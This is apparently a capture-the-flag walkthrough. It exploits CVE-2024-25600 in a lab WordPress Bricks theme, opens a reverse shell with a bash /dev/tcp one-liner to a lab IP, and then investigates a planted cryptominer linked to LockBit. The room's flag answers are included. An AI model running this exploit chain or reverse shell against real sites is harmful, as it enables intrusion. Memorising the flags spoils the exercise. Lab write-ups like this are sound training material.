Add the following entry to your hosts file.
Open the file `/etc/hosts` with root privileges using a text editor:
```BASH
sudo nano /etc/hosts
```
At the end of the file add this line:
```BASH
$ip bricks.thm
```

Start by performing an Nmap scan. Use the following command to scan the target and determine open ports and running services:
```BASH
nmap -sV $ip
```
![image](https://github.com/user-attachments/assets/fd72d9cd-2bb1-4767-b85c-e683530ec48b)  

The scan output shows that the website uses HTTPS on port 443 and that Apache is serving the application.

<span style="line-height:0.5;">&nbsp;</span>

Next, run a Gobuster scan to further examine the website:
```BASH
gobuster dir -u "https://bricks.thm/" -w /usr/share/wordlists/dirb/big.txt -t 10 -x .txt,.php -k
```
![image](https://github.com/user-attachments/assets/9d6f6539-9d61-41c3-95c6-d938f6f9b713)  

The results indicate that the website is using WordPress.

<span style="line-height:0.5;">&nbsp;</span>

### What is the content of the hidden .txt file in the web folder?
Use [WPscan](https://wpscan.com/) to enumerate the WordPress instance:
```BASH
wpscan --url https://bricks.thm --disable-tls-checks --enumerate u,vp,vt
```
- url - target URL
- disable-tls-checks - skip the expired cert problem (same as -k)
- u - enumerate usernames
- vp - vulnerable plugins
- vt - vulnerable themes

![image](https://github.com/user-attachments/assets/f07e50d8-beab-4318-9aff-75ecc53a7895)

The WPScan output shows that the version of the Bricks WordPress theme is vulnerable. The vulnerability is known as [CVE-2024-25600](https://nvd.nist.gov/vuln/detail/CVE-2024-25600). A remote code execution exploit script is available on GitHub. Download that script and check provided README.md, because you have to install additionall libraries from python [source](https://github.com/Chocapikk/CVE-2024-25600). 

<span style="line-height:0.5;">&nbsp;</span>

Run the exploit script using this command:
```BASH
python exploit.py -u https://bricks.thm
```

<span style="line-height:0.5;">&nbsp;</span>

The exploit should allow you to execute code on the target server and eventually give you a shell. When you receive the shell, you must stabilize it. Set up a Netcat listener on your machine with this command:
```BASH
nc -lvnp 4444
```
In the compromised shell, run:
```BASH
bash -c 'bash -i >& /dev/tcp/10.10.96.142/4444 0>&1'
```
![image](https://github.com/user-attachments/assets/d92e241f-15f1-4da1-abad-e22b2d18156d)
![image](https://github.com/user-attachments/assets/1574c009-afb3-48ad-903b-cc124c46c6bd)

<pre>THM{fl46_650c844110baced87e1606453b93f22a}</pre>

This action creates a reverse shell that connects back to your Netcat listener. To further stabilize the shell, execute this command within the Netcat session:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<span style="line-height:0.5;">&nbsp;</span>

### What is the name of the suspicious process?
Inspect the running processes by using `systemctl | grep running` command.  

![image](https://github.com/user-attachments/assets/54b8fffe-6262-45b2-a332-4fe0814e385c)  

There is a suspicious process named ubuntu.service TRYHACK3M. To examine the process in detail, display the contents of the service file:
```BASH
cat /etc/systemd/system/ubuntu.service                                                     
```
![image](https://github.com/user-attachments/assets/f2d9ea26-3284-4bb8-afe8-65f977fef8fd) 

The file shows that the suspicious process is called nm-inet-dialog. Its associated service is named ubuntu.service.
<pre>nm-inet-dialog</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the service name affiliated with the suspicious process?
<pre>ubuntu.service</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the log file name of the miner instance?
Next, investigate the log file for the miner instance: `ExecStart=/lib/NetworkManager/nm-inet-dialog`. Change into the directory: `/lib/NetworkManager`:
```BASH
cd /lib/NetworkManager                                                  
```
![image](https://github.com/user-attachments/assets/ffeaf339-0750-41d9-812f-7ca0c49c1252)  

List the directory contents and note that there is a configuration file called `inet.conf`. View the file with:
```BASH
cat inet.conf                                               
```
![image](https://github.com/user-attachments/assets/2f313a83-75ba-4da2-8d98-554c60e3a5f3)
<pre>inet.conf</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the wallet address of the miner instance?
The file contains settings that include an encrypted or obfuscated wallet identifier. Retrieve the miner’s wallet address by copying the value from the file and decrypt the value with [CyberChef](https://gchq.github.io/CyberChef/).

![image](https://github.com/user-attachments/assets/14c37060-f054-4fae-889c-d2350f2252c6)  

After decryption you receive two similar bitcoin wallet addresses:
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
`bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`    

You check both addresses on a [blockchain explorer](https://www.blockchain.com/en/). The first address shows the expected transaction history. This confirms that the correct wallet address is the first one.  

![image](https://github.com/user-attachments/assets/9d46c7cd-c3e1-42dc-b9c1-d666f3c3d8f9)

![image](https://github.com/user-attachments/assets/ecb9f109-f895-4161-97ea-18496561bae6)

<pre>bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa</pre>

<span style="line-height:0.5;">&nbsp;</span>

### The wallet address used has been involved in transactions between wallets belonging to which threat group?
Finally, determine which threat group is associated with this wallet.  

![image](https://github.com/user-attachments/assets/502326e2-e66c-450d-abd6-847101d44441)

Search for the wallet address 32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM using a search engine. The search results include information from an official [OFAC page](https://ofac.treasury.gov/recent-actions/20240220).

![image](https://github.com/user-attachments/assets/62b412eb-5f19-4d7d-b566-533d3d21d06c)

The record links the wallet with transactions performed by affiliates of a Russian-based threat group. The investigation confirms that the threat group is known as:
<pre>LockBit</pre>
